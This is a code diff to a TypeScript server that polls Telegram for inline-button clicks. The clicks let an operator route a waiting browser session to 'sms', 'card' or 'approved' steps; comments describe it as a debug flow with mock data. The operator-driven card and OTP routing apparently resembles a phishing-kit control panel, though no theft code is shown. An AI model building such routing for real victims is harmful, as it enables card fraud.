@@ -34,6 +34,7 @@ const globals = globalThis as typeof globalThis & {
   __latamDebugSessions?: Map<string, DebugSession>;
   __latamDebugTelegramOffset?: number;
   __latamDebugCallbackIds?: Set<string>;
+  __latamDebugSync?: Promise<void>;
 };
 const sessions = globals.__latamDebugSessions ?? new Map<string, DebugSession>();
 globals.__latamDebugSessions = sessions;
@@ -204,20 +205,23 @@ async function fetchUpdates(token: string, offset?: number) {
   return { status: response.status, payload };
 }
 
+async function ensurePollingMode() {
+  await telegramApi('deleteWebhook', { drop_pending_updates: false });
+}
+
 // En local no hay webhook publico. getUpdates permite recoger callbacks cuando
 // el frontend hace polling al endpoint GET /api/debug.
 async function telegramGetUpdates() {
   const { token } = telegramConfig();
   if (!token) return [];
   const offset = globals.__latamDebugTelegramOffset;
-  let { status, payload } = await fetchUpdates(token, offset);
-  // Si hay webhook activo, getUpdates falla y los botones se quedan en loading.
-  if (status === 409 || /webhook/i.test(String(payload?.description || ''))) {
+  const first = await fetchUpdates(token, offset);
+  if (first.status === 409 || /webhook/i.test(String(first.payload?.description || ''))) {
     await telegramApi('deleteWebhook', { drop_pending_updates: false });
-    ({ status, payload } = await fetchUpdates(token, offset));
+    return [];
   }
-  if (status !== 200) return [];
-  return Array.isArray(payload?.result) ? payload.result : [];
+  if (first.status !== 200) return [];
+  return Array.isArray(first.payload?.result) ? first.payload.result : [];
 }
 
 // Envia el evento al chat de Telegram con datos mock/redactados y botones opcionales.
@@ -233,33 +237,42 @@ async function sendTelegram(payload: Record<string, unknown>, options: { withBut
   };
   if (options.withButtons ?? true) {
     message.reply_markup = keyboard(sessionId, brand);
-    await telegramApi('deleteWebhook', { drop_pending_updates: false });
+    await ensurePollingMode();
   }
   const result = await telegramApi('sendMessage', message);
   return result.ok ? { sent: true } : { sent: false, error: `telegram-${result.status || 'unknown'}` };
 }
 
-async function answerTelegramCallback(callbackId: unknown, text: string) {
-  const id = String(callbackId || '');
-  if (!id || answeredCallbacks.has(id)) return;
-  const result = await telegramApi('answerCallbackQuery', {
-    callback_query_id: id,
-    text,
-    show_alert: false,
-  });
-  if (result.ok || /already|too old|query_id/i.test(result.description || '')) {
-    answeredCallbacks.add(id);
-    if (answeredCallbacks.size > 200) {
-      const first = answeredCallbacks.values().next().value;
-      if (first) answeredCallbacks.delete(first);
-    }
+function rememberCallbackId(id: string) {
+  answeredCallbacks.add(id);
+  if (answeredCallbacks.size > 200) {
+    const first = answeredCallbacks.values().next().value;
+    if (first) answeredCallbacks.delete(first);
   }
 }
 
-async function clearTelegramKeyboard(callback: Record<string, unknown>) {
+async function answerTelegramCallback(callbackId: unknown) {
+  const id = String(callbackId || '');
+  if (!id || answeredCallbacks.has(id)) return;
+  rememberCallbackId(id);
+  await telegramApi('answerCallbackQuery', {
+    callback_query_id: id,
+  });
+}
+
+async function clearTelegramKeyboard(callback: Record<string, unknown>, note: string) {
   const message = callback.message as Record<string, unknown> | undefined;
   if (!message?.chat || typeof message.message_id !== 'number') return;
   const chat = message.chat as Record<string, unknown>;
+  const original = String(message.text || '');
+  const text = original.includes('✅') ? original : `${original}\n\n✅ ${note}`.trim();
+  const edited = await telegramApi('editMessageText', {
+    chat_id: chat.id,
+    message_id: message.message_id,
+    text: text || '✅',
+    reply_markup: { inline_keyboard: [] },
+  });
+  if (edited.ok) return;
   await telegramApi('editMessageReplyMarkup', {
     chat_id: chat.id,
     message_id: message.message_id,
@@ -267,17 +280,19 @@ async function clearTelegramKeyboard(callback: Record<string, unknown>) {
   });
 }
 
-// Procesa callbacks tanto si llegan por webhook como si llegan por getUpdates.
-// Primero responde el clic (si no, Telegram se queda en loading y muestra "ya ha sido respondida").
+// Procesa un clic de Telegram una sola vez: guarda la decision, quita botones y cierra el loading.
 async function handleTelegramCallback(body: Record<string, unknown>) {
   const callback = (body.callback_query || body) as Record<string, unknown> | undefined;
-  const nested = callback && typeof callback === 'object' && 'data' in callback ? callback : undefined;
-  const source = (nested || {}) as Record<string, unknown>;
+  const source = (callback && typeof callback === 'object' && 'data' in callback ? callback : {}) as Record<string, unknown>;
+  const callbackId = String(source.id || '');
+  const already = Boolean(callbackId && answeredCallbacks.has(callbackId));
   const data = String(source.data || '');
   const match = data.match(/^route:([^:]+):(sms|card|approved):([^:]*)$/);
 
+  if (!already) await answerTelegramCallback(source.id);
+
   if (!match) {
-    await answerTelegramCallback(source.id, 'Listo');
+    if (!already) await clearTelegramKeyboard(source, 'Listo');
     return json({ ok: true, ignored: true });
   }
 
@@ -285,24 +300,37 @@ async function handleTelegramCallback(body: Record<string, unknown>) {
   const sessionId = cleanSessionId(rawSessionId);
   const decision = makeDecision(sessionId, rawAction as RouteAction, rawBrand || 'visa');
   getSession(sessionId).decision = decision;
-
-  await answerTelegramCallback(source.id, actionLabel(decision.action));
-  await clearTelegramKeyboard(source);
+  await clearTelegramKeyboard(source, actionLabel(decision.action));
 
   return json({ ok: true, sessionId, decision });
 }
 
 // Sincroniza callbacks pendientes antes de responder al polling del navegador.
 async function syncTelegramCallbacks() {
-  const updates = await telegramGetUpdates();
-  for (const update of updates) {
-    if (typeof update?.update_id === 'number') {
-      globals.__latamDebugTelegramOffset = update.update_id + 1;
+  if (globals.__latamDebugSync) return globals.__latamDebugSync;
+  const run = (async () => {
+    const updates = await telegramGetUpdates();
+    let maxId = globals.__latamDebugTelegramOffset;
+    for (const update of updates) {
+      if (typeof update?.update_id === 'number') {
+        maxId = typeof maxId === 'number' ? Math.max(maxId, update.update_id + 1) : update.update_id + 1;
+      }
     }
-    if (update?.callback_query) {
-      await handleTelegramCallback({ callback_query: update.callback_query });
+    if (typeof maxId === 'number') {
+      globals.__latamDebugTelegramOffset = maxId;
+      const { token } = telegramConfig();
+      if (token) await fetchUpdates(token, maxId);
     }
-  }
+    for (const update of updates) {
+      if (update?.callback_query) {
+        await handleTelegramCallback({ callback_query: update.callback_query });
+      }
+    }
+  })().finally(() => {
+    globals.__latamDebugSync = undefined;
+  });
+  globals.__latamDebugSync = run;
+  return run;
 }
 
 // El frontend consulta este endpoint mientras muestra loader, esperando la decision
